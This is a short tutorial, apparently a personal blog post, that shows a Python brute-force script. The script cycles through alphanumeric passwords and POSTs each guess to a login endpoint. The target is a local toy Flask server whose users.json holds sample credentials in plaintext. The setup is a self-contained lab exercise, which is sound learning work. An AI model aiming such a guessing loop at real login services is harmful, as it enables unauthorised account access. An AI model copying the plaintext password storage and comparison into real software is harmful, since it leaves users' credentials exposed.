---
title: "Simple brute-force attack example"
date: 2020-04-26
---

# Simple brute-force attack example

Let me show you simple brute-force attack that you can perform

__Please make sure that performing brute force attacks on other sites is illegal__

First, you need to write password generating code
Brute-force attack code block in python:
```python
    import requests
    k = 0  # password length
    counter = 0

    alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
    base = len(alphabet)

    while True:
        password = ''  # password

        # generator code
        i = counter
        while i > 0:
            reminder = i % base
            password = alphabet[reminder] + password
            i = i // base

        password = alphabet[0] * (k - len(password)) + password

        print(counter, password)  # test generated code
        response = requests.post('http://127.0.0.1:5000/auth',
                                 json={'login': 'cat', 'password': password})
        if response.status_code == 200:
            print('SUCCESS, password', password)
            break
        counter += 1
        if password == alphabet[-1] * k:  # max_password_for_given_length
            k += 1
            counter = 0
```

Second, since performing brute-force attack is illegal, I created own the simplest server file `server.py` using `flask` library and database `users.json`.

Note: _in real life user logins and passwords are encrypted and their alphabet is more complex than in this example_

`server.py` file code block:
```python
    import json

    from flask import Flask, request, Response

    app = Flask(__name__)

    stats = {
        'attempts': 0,
        'success': 0,
    }


    @app.route('/')
    def hello():
        return f'Hello, user! stats={stats}'


    @app.route('/auth', methods=['POST'])
    def auth():
        stats['attempts'] += 1

        data = request.json
        login = data['login']
        password = data['password']

        with open('users.json') as users_file:
            users = json.load(users_file)

        # users_file = open('users.json')
        # users = json.load(users_file)
        # users_file.close()

        if login in users and users[login] == password:
            status_code = 200
            stats['success'] += 1
        else:
            status_code = 401

        return Response(status=status_code)


    if __name__ == '__main__':
        app.run()

```

`users.json` file code block:
```json
    {
        "admin": "12345",
        "jack": "black",
        "cat": "dog"
    }
```
